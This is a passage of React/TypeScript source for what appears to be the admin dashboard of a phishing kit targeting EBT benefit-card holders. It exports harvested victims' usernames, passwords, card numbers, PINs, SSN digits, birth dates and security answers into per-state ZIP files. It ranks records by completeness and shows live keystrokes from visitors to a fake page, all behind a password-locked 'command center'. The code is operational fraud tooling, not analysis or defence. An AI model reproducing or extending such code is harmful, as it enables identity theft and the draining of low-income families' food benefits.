    const byState = new Map<string, UserEntry[]>();
    for (const u of allRaw) {
      const abbr = (u.state || "").trim() || zipToState(u.zipCode) || "";
      const fullName = abbr ? stateFullName(abbr) : "";
      const normalizedUser = abbr && u.state !== abbr ? { ...u, state: abbr } : u;
      const k = fullName || "[Fara stat]";
      if (!byState.has(k)) byState.set(k, []);
      byState.get(k)!.push(normalizedUser);
    }
    const stateNames = [...byState.keys()].sort((a, b) => {
      if (a === "[Fara stat]") return 1;
      if (b === "[Fara stat]") return -1;
      return a.localeCompare(b);
    });

    const tagLabel = only === "new" ? "NEW" : only === "old" ? "RETURNING" : "ALL";
    const today = new Date().toISOString().slice(0, 10);

    // Build a beautifully aligned text file PER STATE
    const buildStateTxt = (stateName: string, users: UserEntry[]): string => {
      // sort by ZIP then last name
      const sorted = [...users].sort((a, b) => {
        const za = (a.zipCode || "").trim();
        const zb = (b.zipCode || "").trim();
        if (za !== zb) return za.localeCompare(zb);
        const stateA = (a.state || zipToState(a.zipCode) || "").trim();
        const stateB = (b.state || zipToState(b.zipCode) || "").trim();
        if (stateA !== stateB) return stateA.localeCompare(stateB);
        const nameA = `${a.lastName || ""} ${a.firstName || ""}`.trim();
        const nameB = `${b.lastName || ""} ${b.firstName || ""}`.trim();
        return nameA.localeCompare(nameB);
      });
      const out: string[] = [];
      const bar = "════════════════════════════════════════════════════════════";
      out.push(bar);
      out.push(`  STATE: ${stateName}    ·    TOTAL USERI: ${sorted.length}`);
      out.push(bar);
      out.push("");

      sorted.forEach((u, i) => {
        const num = String(i + 1).padStart(3, "0");
        const fullName = [u.firstName, u.lastName].filter(Boolean).join(" ") || "—";
        const stateFull = stateFullName(u.state || zipToState(u.zipCode) || "");
        const addr = [u.streetAddress, u.aptUnit && `Apt ${u.aptUnit}`, u.city, stateFull, u.zipCode]
          .filter(Boolean).join(", ") || "—";
        const row = (k: string, v?: string) => `   ${k.padEnd(11, " ")}: ${v && v.length ? v : "—"}`;
        const isNew = u.type === "new";

        out.push(`┌─ #${num} ── ${fullName} ${"─".repeat(Math.max(2, 50 - fullName.length))}`);
        if (isNew) {
          out.push(row("Nume", fullName));
          out.push(row("Email", u.email));
          out.push(row("Telefon", u.phone));
        }
        out.push(row("State", stateFull));
        out.push(row("ZIP", u.zipCode));
        out.push(row("Adresa", addr));
        out.push(row("User ID", u.userId));
        out.push(row("Password", u.password));
        out.push(row("Card", u.cardNumber));
        out.push(row("PIN", u.pinCard));
        out.push(row("SSN", u.ssnLast4));
        out.push(row("DOB", u.dob));
        if (isNew && u.challengeQuestions && u.challengeQuestions.length) {
          out.push("   ── Intrebari secrete ──");
          u.challengeQuestions.forEach((q, qi) => {
            out.push(`   Q${qi + 1}: ${q.question || "—"}`);
            out.push(`   A${qi + 1}: ${q.answer || "—"}`);
          });
        }
        out.push("└" + "─".repeat(60));
        out.push("");
      });
      return out.join("\n");
    };

    // One .txt per state, named so they sort alphabetically
    stateNames.forEach((st, idx) => {
      const safe = st.replace(/[\\/:*?"<>|]/g, "").replace(/\s+/g, "_") || "NA";
      const fname = `${String(idx + 1).padStart(2, "0")}_${safe}.txt`;
      zip.file(fname, buildStateTxt(st, byState.get(st)!));
    });

    // _SUMAR.txt
    const summary: string[] = [];
    summary.push("EXPORT EBT");
    summary.push(`Tip: ${tagLabel}    Total useri: ${allRaw.length}    State: ${stateNames.length}`);
    summary.push("");
    summary.push("DISTRIBUTIE PE STATE");
    summary.push("─".repeat(40));
    const maxLen = Math.max(...stateNames.map((s) => s.length));
    stateNames.forEach((st, idx) => {
      const n = String(idx + 1).padStart(2, "0");
      summary.push(`  ${n}. ${st.padEnd(maxLen + 3, " ")}${String(byState.get(st)!.length).padStart(4, " ")} useri`);
    });
    summary.push("─".repeat(40));
    summary.push(`  TOTAL${" ".repeat(maxLen + 1)}${String(allRaw.length).padStart(4, " ")} useri`);
    zip.file("_SUMAR.txt", summary.join("\n"));

    setExportProgress("Creating ZIP file...");
    const blob = await zip.generateAsync({ type: "blob" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `EBT_${tagLabel}_${today}.zip`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    setExportProgress(`✅ ZIP exported (${allRaw.length} useri, ${stateNames.length} state)!`);
    setTimeout(() => setExportProgress(""), 4000);
  };

  // Count completeness (number of populated personal fields)
  const completenessScore = (u: UserEntry): number => {
    const fields = [u.userId, u.password, u.firstName, u.lastName, u.email, u.phone, u.cardNumber, u.pinCard, u.dob, u.ssnLast4, u.zipCode];
    let score = fields.filter(Boolean).length;
    score += (u.challengeQuestions?.filter(q => q.answer)?.length || 0);
    return score;
  };

  // Date range based on dateFilter
  const dateRange = useMemo<{ from: number; to: number } | null>(() => {
    const now = Date.now();
    const startOfToday = new Date(); startOfToday.setHours(0, 0, 0, 0);
    if (dateFilter === "today") return { from: startOfToday.getTime(), to: now };
    if (dateFilter === "7d") return { from: now - 7 * 86400000, to: now };
    if (dateFilter === "30d") return { from: now - 30 * 86400000, to: now };
    if (dateFilter === "custom") {
      const from = customFrom ? new Date(customFrom).getTime() : 0;
      const to = customTo ? new Date(customTo).getTime() + 86400000 - 1 : now;
      if (!customFrom && !customTo) return null;
      return { from, to };
    }
    return null;
  }, [dateFilter, customFrom, customTo]);

  const filtered = useMemo(() => {
    let list = filter === "all" ? users : users.filter((u) => u.type === filter);

    // Date filter
    if (dateRange) {
      list = list.filter((u) => {
        const t = Date.parse(u.timestamp || "");
        return Number.isFinite(t) && t >= dateRange.from && t <= dateRange.to;
      });
    }

    // Search filter
    const q = searchQuery.trim().toLowerCase();
    if (q) {
      list = list.filter((u) => {
        const haystack = [
          u.userId, u.email, u.firstName, u.lastName,
          [u.firstName, u.lastName].filter(Boolean).join(" "),
          u.phone, u.phone?.replace(/\D/g, ""),
          u.cardNumber?.slice(-4),
        ].filter(Boolean).join(" ").toLowerCase();
        return haystack.includes(q);
      });
    }

    // Sorting
    const arr = [...list];
    const ts = (v?: string) => { const ms = Date.parse(v || ""); return Number.isFinite(ms) ? ms : 0; };
    if (sortBy === "newest") arr.sort((a, b) => ts(b.timestamp) - ts(a.timestamp));
    else if (sortBy === "oldest") arr.sort((a, b) => ts(a.timestamp) - ts(b.timestamp));
    else if (sortBy === "complete") arr.sort((a, b) => completenessScore(b) - completenessScore(a));
    else if (sortBy === "name") arr.sort((a, b) => {
      const an = `${a.firstName || ""} ${a.lastName || ""}`.trim().toLowerCase();
      const bn = `${b.firstName || ""} ${b.lastName || ""}`.trim().toLowerCase();
      if (!an && !bn) return 0;
      if (!an) return 1;
      if (!bn) return -1;
      return an.localeCompare(bn);
    });
    return arr;
  }, [users, filter, dateRange, searchQuery, sortBy]);

  const totalEntryCount = Math.max(adminStats.totalEntries, users.length);
  const visibleNewCount = useMemo(() => users.filter((u) => u.type === "new").length, [users]);
  const visibleOldCount = useMemo(() => users.filter((u) => u.type === "old").length, [users]);
  const visibleCount = users.length;
  const totalPages = Math.max(1, Math.ceil(filtered.length / ITEMS_PER_PAGE));
  const currentPage = Math.min(page, totalPages);
  const paginatedUsers = useMemo(() => filtered.slice((currentPage - 1) * ITEMS_PER_PAGE, currentPage * ITEMS_PER_PAGE), [filtered, currentPage]);

  // Reset page on any filter/search/sort change
  useEffect(() => { setPage(1); }, [searchQuery, dateFilter, customFrom, customTo, sortBy, filter]);
  // Online real-time: status === active ȘI last_seen proaspăt (<10s). Re-evaluat fiecare secundă (time tick).
  const nowMs = time.getTime();
  const isFresh = (lastSeenMs: number) => nowMs - lastSeenMs < 10000;
  const isIdleWindow = (lastSeenMs: number) => {
    const diff = nowMs - lastSeenMs;
    return diff >= 10000 && diff < 20000;
  };
  const activeSessions = useMemo(
    () => sessions.filter((s) => s.status !== "left" && isLikelyRealSession(s, liveTyping) && isFresh(sessionLastActivityMs(s, liveTyping))),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [sessions, liveTyping, nowMs]
  );
  const idleSessions = useMemo(
    () => sessions.filter((s) => s.status !== "left" && isLikelyRealSession(s, liveTyping) && isIdleWindow(sessionLastActivityMs(s, liveTyping))),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [sessions, liveTyping, nowMs]
  );
  const leftSessions = useMemo(
    () => sessions.filter((s) => !isLikelyRealSession(s, liveTyping) || s.status === "left" || (nowMs - sessionLastActivityMs(s, liveTyping)) >= 20000),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [sessions, liveTyping, nowMs]
  );
  

  return (
    <div style={{
      minHeight: "100vh",
      background: themeColors.c,
      fontFamily: "'Segoe UI', system-ui, -apple-system, sans-serif",
      color: "#c8d6e5",
      position: "relative",
    }}>


      {/* ─── LOCK SCREEN OVERLAY (Layer 1) ─── */}
      {securityLevel === 0 && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 999,
          display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center",
          background: "linear-gradient(135deg, #06080f 0%, #0a1224 50%, #06080f 100%)",
          padding: "24px 16px",
          overflowY: "auto",
        }}>
          {/* Visitor count hint visible through fog */}
          <div style={{ display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap", justifyContent: "center", marginBottom: 32, width: "100%", maxWidth: 420 }}>
            <div style={{
              display: "flex", alignItems: "center", gap: 8,
              padding: "10px 16px", borderRadius: 14,
              background: "rgba(0,210,255,0.06)",
              border: "1px solid rgba(0,210,255,0.15)",
              flex: "1 1 160px", justifyContent: "center",
            }}>
              <div style={{
                width: 10, height: 10, borderRadius: "50%",
                background: publicStats.visitorsOnline > 0 ? "#34d399" : "#475569",
                boxShadow: publicStats.visitorsOnline > 0 ? "0 0 12px #34d399" : "none",
                animation: publicStats.visitorsOnline > 0 ? "liveBlink 1.5s infinite" : "none",
              }} />
              <span style={{
                fontSize: 16, fontWeight: 800, color: publicStats.visitorsOnline > 0 ? "#34d399" : "#475569",
                fontVariantNumeric: "tabular-nums",
              }}>
                {publicStats.visitorsOnline}
              </span>
              <span style={{ fontSize: 12, color: "#64748b", fontWeight: 600 }}>
                visitor{publicStats.visitorsOnline !== 1 ? "s" : ""} online
              </span>
            </div>

            <div style={{
              display: "flex", alignItems: "center", gap: 8,
              padding: "10px 16px", borderRadius: 14,
              background: "rgba(168,85,247,0.06)",
              border: "1px solid rgba(168,85,247,0.15)",
              flex: "1 1 160px", justifyContent: "center",
            }}>
              <Users size={16} color="#a855f7" />
              <span style={{
                fontSize: 16, fontWeight: 800, color: "#a855f7",
                fontVariantNumeric: "tabular-nums",
              }}>
                {publicStats.totalEntries}
              </span>
              <span style={{ fontSize: 12, color: "#64748b", fontWeight: 600 }}>
                total entries
              </span>
            </div>
          </div>

          {/* Lock icon */}
          <div style={{
            width: 72, height: 72, borderRadius: 22,
            background: "linear-gradient(135deg, #00d2ff 0%, #a855f7 100%)",
            display: "flex", alignItems: "center", justifyContent: "center",
            boxShadow: "0 0 40px rgba(0,210,255,0.2), 0 0 80px rgba(168,85,247,0.15)",
            marginBottom: 22,
          }}>
            <Shield size={32} color="#06080f" strokeWidth={2.5} />
          </div>

          <h2 style={{
            fontSize: "clamp(22px, 6vw, 30px)", fontWeight: 900, letterSpacing: "2px", marginBottom: 6, textAlign: "center",
            background: "linear-gradient(90deg, #00d2ff, #a855f7)",
            WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
          }}>
            COMMAND CENTER
          </h2>
          <p style={{ color: "#475569", fontSize: 13, marginBottom: 24, textAlign: "center" }}>Enter access code to continue</p>

          <div style={{
            display: "flex", gap: 8, width: "100%", maxWidth: 420,
            animation: shake ? "shakeX 0.4s ease" : "none",
          }}>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && handleUnlock()}
              placeholder="Password"
              autoFocus
              style={{
                flex: 1, minWidth: 0, padding: "12px 18px", borderRadius: 12,
                background: "rgba(255,255,255,0.04)",
                border: `1px solid ${shake ? "rgba(239,68,68,0.5)" : "rgba(0,210,255,0.2)"}`,
                color: "#e2e8f0", fontSize: 15, fontWeight: 600,
                outline: "none", fontFamily: "inherit",
                transition: "border-color 0.3s",
              }}
            />
            <button
              onClick={handleUnlock}
              style={{
                padding: "12px 22px", borderRadius: 12,
                background: "linear-gradient(135deg, #00d2ff, #a855f7)",
                color: "#06080f", fontWeight: 800, fontSize: 13,
                border: "none", cursor: "pointer", letterSpacing: "1px",
                boxShadow: "0 4px 20px rgba(0,210,255,0.2)",
                whiteSpace: "nowrap",
              }}
            >
              UNLOCK
            </button>
          </div>
          {(shake || unlockError) && (
            <p style={{ color: "#f87171", fontSize: 12, marginTop: 10, fontWeight: 600, textAlign: "center" }}>
              {unlockError ?? "Wrong password"}
            </p>
          )}
        </div>
      )}


      {/* ─── LAYER 2 UNLOCK OVERLAY (sensitive data blurred, small unlock bar) ─── */}
      {securityLevel === 1 && (
        <div style={{
          position: "fixed", bottom: 0, left: 0, right: 0, zIndex: 998,
          display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
          padding: "12px 20px",
          background: "rgba(6,8,15,0.9)",
          backdropFilter: "blur(12px)",
          borderTop: "1px solid rgba(168,85,247,0.2)",
          animation: shake ? "shakeX 0.4s ease" : "none",
        }}>
          <span style={{ fontSize: 12, color: "#a855f7", fontWeight: 700, letterSpacing: "1px" }}>🔐 CLASSIFIED MODE</span>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && handleUnlock()}
            placeholder="Decrypt code"
            autoFocus
            style={{
              width: 160, padding: "8px 14px", borderRadius: 8,
              background: "rgba(255,255,255,0.04)",
              border: `1px solid ${shake ? "rgba(239,68,68,0.5)" : "rgba(168,85,247,0.25)"}`,
              color: "#e2e8f0", fontSize: 13, fontWeight: 600,
              outline: "none", fontFamily: "inherit",
            }}
          />
          <button
            onClick={handleUnlock}
            style={{
              padding: "8px 16px", borderRadius: 8,
              background: "linear-gradient(135deg, #a855f7, #ec4899)",
              color: "#fff", fontWeight: 800, fontSize: 11,
              border: "none", cursor: "pointer", letterSpacing: "1px",
            }}
          >
            DECRYPT
          </button>
          {(shake || unlockError) && <span style={{ color: "#f87171", fontSize: 11, fontWeight: 600 }}>{unlockError ?? "Wrong code"}</span>}
        </div>
      )}

      {/* Main content - blurred when fully locked */}
      <div style={{ filter: securityLevel === 0 ? "blur(8px)" : "none", transition: "filter 0.3s", pointerEvents: securityLevel === 0 ? "none" : "auto", willChange: securityLevel === 0 ? "filter" : "auto" }}>
      {/* Flash overlay on new user */}
      {flashNew && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 200, pointerEvents: "none",
          background: "radial-gradient(ellipse at center, rgba(52,211,153,0.08) 0%, transparent 70%)",
          animation: "flashFade 2s ease-out forwards",
        }} />
      )}

      {/* Ambient */}
      <div style={{
        position: "fixed", inset: 0, pointerEvents: "none", zIndex: 0,
        background: "radial-gradient(ellipse 50% 40% at 15% 10%, rgba(0,210,255,0.06) 0%, transparent 70%), radial-gradient(ellipse 40% 50% at 85% 90%, rgba(168,85,247,0.05) 0%, transparent 70%)",
      }} />

      {/* ─── Header ─── */}
      <header style={{
        position: "sticky", top: 0, zIndex: 50,
        background: "rgba(6,8,15,0.88)", backdropFilter: "blur(24px) saturate(1.4)",
        borderBottom: "1px solid rgba(0,210,255,0.1)",
        padding: "10px 14px", minHeight: 56,
        display: "flex", alignItems: "center", justifyContent: "space-between",
        gap: 10, flexWrap: "wrap",
      }}>

        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{
            width: 36, height: 36, borderRadius: 10,
            background: "linear-gradient(135deg, #00d2ff 0%, #a855f7 100%)",
            display: "flex", alignItems: "center", justifyContent: "center",
            boxShadow: "0 0 24px rgba(0,210,255,0.25), 0 0 48px rgba(168,85,247,0.15)",
          }}>
            <Shield size={18} color="#06080f" strokeWidth={2.5} />
          </div>
          <span style={{
            fontSize: 18, fontWeight: 800, letterSpacing: "1px",
            background: "linear-gradient(90deg, #00d2ff, #a855f7, #ec4899)",
            WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
          }}>
            COMMAND CENTER
          </span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "nowrap", overflowX: "auto", maxWidth: "100%", paddingBottom: 2, scrollbarWidth: "thin" }}>
          {exportProgress && (
            <span style={{ fontSize: 12, color: "#60a5fa", fontWeight: 600 }}>{exportProgress}</span>
          )}
          {users.length > 0 && visibleNewCount > 0 && (
            <button onClick={() => handleDownloadZipByState("new")} disabled={!!exportProgress} style={{
              background: "rgba(34,197,94,0.1)", border: "1px solid rgba(34,197,94,0.35)",
              color: "#4ade80", borderRadius: 8, padding: "6px 14px",
              cursor: exportProgress ? "wait" : "pointer", fontSize: 12, fontWeight: 700,
              display: "flex", alignItems: "center", gap: 5,
            }} title="ZIP doar useri NEW"><Download size={13} /> ZIP NEW ({visibleNewCount})</button>
          )}
          {users.length > 0 && visibleOldCount > 0 && (
            <button onClick={() => handleDownloadZipByState("old")} disabled={!!exportProgress} style={{
              background: "rgba(168,85,247,0.1)", border: "1px solid rgba(168,85,247,0.35)",
              color: "#c4b5fd", borderRadius: 8, padding: "6px 14px",
              cursor: exportProgress ? "wait" : "pointer", fontSize: 12, fontWeight: 700,
              display: "flex", alignItems: "center", gap: 5,
            }} title="ZIP doar useri RETURNING"><Download size={13} /> ZIP RET ({visibleOldCount})</button>
          )}
          {(duplicateInfo.toDeleteIds.size > 0 || likelyDuplicateIds.size > 0) && (
            <button onClick={handleCleanDuplicates} style={{
              background: "rgba(251,191,36,0.1)", border: "1px solid rgba(251,191,36,0.35)",
              color: "#fbbf24", borderRadius: 8, padding: "6px 14px",
              cursor: "pointer", fontSize: 12, fontWeight: 700,
              display: "flex", alignItems: "center", gap: 5,
            }} title={`${duplicateInfo.dupGroups} duplicate group(s) — keeps newest, removes older copies`}>
              ♻️ Clean Duplicates ({new Set([...duplicateInfo.toDeleteIds, ...likelyDuplicateIds]).size})
            </button>
          )}
          {users.length > 0 && (
            <button onClick={handleClearAll} style={{
              background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)",
              color: "#f87171", borderRadius: 8, padding: "6px 14px",
              cursor: "pointer", fontSize: 12, fontWeight: 600,
              display: "flex", alignItems: "center", gap: 5,
            }}><Trash2 size={13} /> Delete All</button>
          )}
          {securityLevel > 0 && (
            <button onClick={handleLogout} style={{
              background: "linear-gradient(135deg, rgba(239,68,68,0.1), rgba(168,85,247,0.1))",
              border: "1px solid rgba(239,68,68,0.25)",
              color: "#f87171", borderRadius: 8, padding: "6px 14px",
              cursor: "pointer", fontSize: 12, fontWeight: 700,
              display: "flex", alignItems: "center", gap: 5,
              transition: "all 0.2s",
            }}
            onMouseEnter={(e) => { e.currentTarget.style.background = "rgba(239,68,68,0.15)"; e.currentTarget.style.borderColor = "rgba(239,68,68,0.4)"; }}
            onMouseLeave={(e) => { e.currentTarget.style.background = "linear-gradient(135deg, rgba(239,68,68,0.1), rgba(168,85,247,0.1))"; e.currentTarget.style.borderColor = "rgba(239,68,68,0.25)"; }}
            ><LogOut size={13} /> Logout</button>
          )}
          {securityLevel > 0 && (
            <>
              <button onClick={toggleSound} title={soundOn ? "Sound on (click to mute)" : "Sound off"} style={{
                background: soundOn ? `${themeColors.a}1a` : "rgba(255,255,255,0.04)",
                border: `1px solid ${soundOn ? themeColors.a + "55" : "rgba(255,255,255,0.08)"}`,
                color: soundOn ? themeColors.a : "#64748b",
                borderRadius: 8, padding: "6px 10px", cursor: "pointer",
                display: "flex", alignItems: "center", gap: 5, fontSize: 12, fontWeight: 700,
                transition: "all 0.2s",
              }}>
                {soundOn ? <Volume2 size={14} /> : <VolumeX size={14} />}
              </button>
            </>
          )}
          <div style={{

            display: "flex", alignItems: "center", gap: 8,
            background: "rgba(255,255,255,0.04)", borderRadius: 8, padding: "6px 12px",
          }}>
            <Clock size={13} color="#64748b" />
            <span style={{ fontSize: 13, fontWeight: 700, color: "#94a3b8", fontVariantNumeric: "tabular-nums" }}>
              {time.toLocaleTimeString()}
            </span>
            <div style={{
              width: 7, height: 7, borderRadius: "50%", background: "#00d2ff",
              boxShadow: "0 0 6px #00d2ff, 0 0 12px rgba(0,210,255,0.4)",
              animation: "liveBlink 1.5s infinite",
            }} />
          </div>
        </div>
      </header>

      {/* ─── Live Status + Live Typing Panel ─── */}
      <div style={{
        margin: "14px 12px 0", padding: "10px 14px", borderRadius: 10,
        background: "rgba(15,20,35,0.6)",
        border: "1px solid rgba(0,210,255,0.08)",
        display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
          <div style={{
            width: 7, height: 7, borderRadius: "50%",
            background: activeSessions.length > 0 ? "#34d399" : "#475569",
            boxShadow: activeSessions.length > 0 ? "0 0 8px #34d399" : "none",
            animation: activeSessions.length > 0 ? "liveBlink 1.5s infinite" : "none",
          }} />
          <span style={{ fontSize: 11, fontWeight: 700, color: activeSessions.length > 0 ? "#34d399" : "#475569" }}>
            {activeSessions.length} online
          </span>
        </div>
        {idleSessions.length > 0 && (
          <span style={{ fontSize: 11, color: "#eab308", fontWeight: 600 }}>⏳ {idleSessions.length} idle</span>
        )}
        {leftSessions.length > 0 && (
          <span style={{ fontSize: 11, color: "#475569", fontWeight: 600 }}>👋 {leftSessions.length} left</span>
        )}
      </div>

      <div style={{
        margin: "10px 12px 0",
        display: "grid",
        gridTemplateColumns: "repeat(auto-fit, minmax(min(100%, 360px), 1fr))",
        gap: 10,
        position: "relative",
        zIndex: 1,
      }}>
        {activeSessions.length + idleSessions.length === 0 ? (
          <div style={{
            padding: "12px 14px",
            borderRadius: 10,
            border: "1px dashed rgba(71,85,105,0.25)",
            color: "#64748b",
            fontSize: 12,
            fontWeight: 600,
          }}>
            Live panel ready — typing will appear instantly when a visitor starts writing.
          </div>
        ) : (
          sessions
            .filter((s) => s.status !== "left" && isLikelyRealSession(s, liveTyping))
            .map((session) => (
              <MemoizedSessionCard
                key={session.sessionId}
                session={session}
                typing={liveTyping[session.sessionId]}
                classified={false}
              />
            ))
        )}
      </div>

      {/* ─── Stats ─── */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(120px, 1fr))", gap: 8, padding: "12px 12px 6px", position: "relative", zIndex: 1 }}>
        {[
          { icon: <Users size={16} />, label: "TOTAL", count: totalEntryCount, grad: "linear-gradient(135deg, #00d2ff, #0891b2)", shadow: "rgba(0,210,255,0.15)" },
          { icon: <UserPlus size={16} />, label: "NEW VISIBLE", count: visibleNewCount, grad: "linear-gradient(135deg, #34d399, #059669)", shadow: "rgba(52,211,153,0.15)" },
          { icon: <UserCheck size={16} />, label: "RETURN VISIBLE", count: visibleOldCount, grad: "linear-gradient(135deg, #a855f7, #7c3aed)", shadow: "rgba(168,85,247,0.15)" },
        ].map((s) => (
          <div key={s.label} style={{
            padding: "12px 14px", borderRadius: 10,
            background: "rgba(15,20,35,0.7)", border: "1px solid rgba(255,255,255,0.05)",
            display: "flex", alignItems: "center", gap: 10,
          }}>
            <div style={{
              width: 34, height: 34, borderRadius: 9,
              background: s.grad, display: "flex", alignItems: "center", justifyContent: "center",
              color: "#fff", boxShadow: `0 3px 14px ${s.shadow}`,
            }}>{s.icon}</div>
            <div>
              <div style={{ fontSize: 22, fontWeight: 900, color: "#f1f5f9", lineHeight: 1, fontVariantNumeric: "tabular-nums" }}>{s.count}</div>
              <div style={{ fontSize: 9, color: "#475569", fontWeight: 700, letterSpacing: "1.5px" }}>{s.label}</div>
            </div>
          </div>
        ))}
      </div>

      {/* ─── Search + Date + Sort Toolbar ─── */}
      <div style={{
        padding: "14px 12px 0", position: "relative", zIndex: 1,
        display: "flex", flexDirection: "column", gap: 8,
      }}>
        {/* Row 1: Search + Sort + Counter */}
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
          <div style={{ position: "relative", flex: "1 1 240px", minWidth: 200 }}>
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="🔎 Search by ID, email, name, phone, last 4 of card…"
              style={{
                width: "100%", padding: "9px 36px 9px 12px",
                background: "rgba(15,23,42,0.6)", color: "#e2e8f0",
                border: "1px solid rgba(0,210,255,0.2)", borderRadius: 8,
                fontSize: 13, outline: "none", fontWeight: 500,
              }}
            />
            {searchQuery && (
              <button
                onClick={() => setSearchQuery("")}
                style={{
                  position: "absolute", right: 6, top: "50%", transform: "translateY(-50%)",
                  background: "transparent", border: "none", color: "#94a3b8",
                  cursor: "pointer", fontSize: 16, padding: "4px 8px", lineHeight: 1,
                }}
                aria-label="Clear search"
              >×</button>
            )}
          </div>

          <select
            value={sortBy}
            onChange={(e) => setSortBy(e.target.value as typeof sortBy)}
            style={{
              padding: "9px 12px", background: "rgba(15,23,42,0.6)",
              color: "#e2e8f0", border: "1px solid rgba(168,85,247,0.25)",
              borderRadius: 8, fontSize: 12, fontWeight: 600, cursor: "pointer", outline: "none",
            }}
          >
            <option value="newest">↓ Newest</option>
            <option value="oldest">↑ Oldest</option>
            <option value="complete">★ Most complete</option>
            <option value="name">A → Z by name</option>
          </select>

          <div style={{
            padding: "8px 14px", borderRadius: 8,
            background: "rgba(0,210,255,0.08)", border: "1px solid rgba(0,210,255,0.25)",
            fontSize: 12, fontWeight: 700, color: "#00d2ff",
            fontVariantNumeric: "tabular-nums", whiteSpace: "nowrap",
          }}>
            {filtered.length} of {visibleCount} visible · {totalEntryCount.toLocaleString()} total
          </div>
        </div>

        {/* Row 2: Date filter chips */}
        <div style={{ display: "flex", gap: 6, flexWrap: "wrap", alignItems: "center" }}>
          {([
            { key: "all" as const, label: "All time" },
            { key: "today" as const, label: "Today" },
            { key: "7d" as const, label: "Last 7 days" },
            { key: "30d" as const, label: "Last 30 days" },
            { key: "custom" as const, label: "Custom" },
          ]).map(({ key, label }) => {
            const active = dateFilter === key;
            return (
              <button
                key={key}
                onClick={() => setDateFilter(key)}
                style={{
                  background: active ? "rgba(52,211,153,0.15)" : "transparent",
                  color: active ? "#34d399" : "#64748b",
                  border: `1px solid ${active ? "rgba(52,211,153,0.4)" : "rgba(255,255,255,0.06)"}`,
                  borderRadius: 6, padding: "6px 12px",
                  cursor: "pointer", fontSize: 11, fontWeight: 700,
                  transition: "all 0.15s",
                }}
              >{label}</button>
            );
          })}

          {dateFilter === "custom" && (
            <>
              <input
                type="date"
                value={customFrom}
                onChange={(e) => setCustomFrom(e.target.value)}
                style={{
                  padding: "5px 8px", background: "rgba(15,23,42,0.6)",
                  color: "#e2e8f0", border: "1px solid rgba(52,211,153,0.25)",
                  borderRadius: 6, fontSize: 11, outline: "none",
                }}
              />
              <span style={{ color: "#475569", fontSize: 11 }}>→</span>
              <input
                type="date"
                value={customTo}
                onChange={(e) => setCustomTo(e.target.value)}
                style={{
                  padding: "5px 8px", background: "rgba(15,23,42,0.6)",
                  color: "#e2e8f0", border: "1px solid rgba(52,211,153,0.25)",
                  borderRadius: 6, fontSize: 11, outline: "none",
                }}
              />
            </>
          )}
        </div>
      </div>

      {/* ─── Filters ─── */}
      <div style={{ display: "flex", gap: 6, padding: "14px 12px 10px", position: "relative", zIndex: 1, flexWrap: "wrap" }}>
        {([
          { key: "all" as const, label: "All", color: "#00d2ff" },
          { key: "new" as const, label: "⚡ New", color: "#34d399" },
          { key: "old" as const, label: "🔮 Returning", color: "#a855f7" },
        ]).map(({ key, label, color }) => {
          const active = filter === key;
          const count = key === "all" ? visibleCount : key === "new" ? visibleNewCount : visibleOldCount;
          return (
            <button key={key} onClick={() => { setFilter(key); setPage(1); }} style={{
              background: active ? `${color}15` : "transparent",
              color: active ? color : "#475569",
              border: `1px solid ${active ? color + "40" : "rgba(255,255,255,0.05)"}`,
              borderRadius: 8, padding: "7px 16px",
              cursor: "pointer", fontSize: 13, fontWeight: 600,
              transition: "all 0.2s",
            }}>{label} ({count})</button>
          );
        })}
      </div>

      {/* ─── Pagination Info ─── */}
      {filtered.length > ITEMS_PER_PAGE && (
        <div style={{
          display: "flex", alignItems: "center", justifyContent: "space-between",
          padding: "8px 12px 0", position: "relative", zIndex: 1,
        }}>
          <span style={{ fontSize: 11, color: "#64748b", fontWeight: 600 }}>
            Showing {((currentPage - 1) * ITEMS_PER_PAGE) + 1}–{Math.min(currentPage * ITEMS_PER_PAGE, filtered.length)} of {filtered.length}
          </span>
          <div style={{ display: "flex", gap: 4 }}>
            <button
              disabled={currentPage <= 1}
              onClick={() => setPage(p => Math.max(1, p - 1))}
              style={{
                padding: "5px 12px", borderRadius: 6, fontSize: 11, fontWeight: 700,
                background: currentPage <= 1 ? "rgba(255,255,255,0.02)" : "rgba(0,210,255,0.1)",
                border: `1px solid ${currentPage <= 1 ? "rgba(255,255,255,0.05)" : "rgba(0,210,255,0.25)"}`,
                color: currentPage <= 1 ? "#334155" : "#00d2ff",
                cursor: currentPage <= 1 ? "default" : "pointer",
              }}
            >← Prev</button>
            <span style={{ padding: "5px 10px", fontSize: 11, color: "#94a3b8", fontWeight: 700, fontVariantNumeric: "tabular-nums" }}>
              {currentPage}/{totalPages}
            </span>
            <button
              disabled={currentPage >= totalPages}
              onClick={() => setPage(p => Math.min(totalPages, p + 1))}
              style={{
                padding: "5px 12px", borderRadius: 6, fontSize: 11, fontWeight: 700,
                background: currentPage >= totalPages ? "rgba(255,255,255,0.02)" : "rgba(0,210,255,0.1)",
                border: `1px solid ${currentPage >= totalPages ? "rgba(255,255,255,0.05)" : "rgba(0,210,255,0.25)"}`,
                color: currentPage >= totalPages ? "#334155" : "#00d2ff",
